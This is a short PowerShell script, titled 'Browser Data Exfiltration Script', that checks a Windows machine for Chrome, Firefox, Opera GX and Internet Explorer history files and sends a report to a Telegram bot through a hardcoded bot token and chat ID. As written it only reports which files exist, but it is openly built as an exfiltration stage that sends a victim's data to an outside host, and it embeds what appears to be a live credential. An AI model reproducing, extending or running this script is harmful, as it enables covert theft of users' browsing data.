# Browser Data Exfiltration Script
# Author: En9mm

function exfilTelegram($Token, $ChatID, $Text){
    $uri = "https://api.telegram.org/bot$Token/sendMessage"
    Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body (@{
        chat_id = $ChatID
        text = $Text
    } | ConvertTo-Json)
}

# Collect browser data
$browserData = "Browser History and Bookmarks:`n"

# Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
if(Test-Path $chromePath){
    $browserData += "`n[+] Chrome history file found."
}else{
    $browserData += "`n[-] Chrome history file not found."
}

# Firefox
$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\"
if(Test-Path $firefoxPath){
    $browserData += "`n[+] Firefox profile folder found."
}else{
    $browserData += "`n[-] Firefox profile folder not found."
}

# Opera GX
$operaGXPath = "$env:APPDATA\Opera Software\Opera GX Stable\History"
if(Test-Path $operaGXPath){
    $browserData += "`n[+] Opera GX history file found."
}else{
    $browserData += "`n[-] Opera GX history file not found."
}

# IE (Internet Explorer)
$iePath = "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\WebCacheV01.dat"
if(Test-Path $iePath){
    $browserData += "`n[+] IE history file found."
}else{
    $browserData += "`n[-] IE history file not found."
}

# Send data to Telegram
exfilTelegram -Token '7921423137:AAHj4kDraZc0BRPk6c6j7TC2vJE5Dy-6j0g' -ChatID '774651165' -Text $browserData
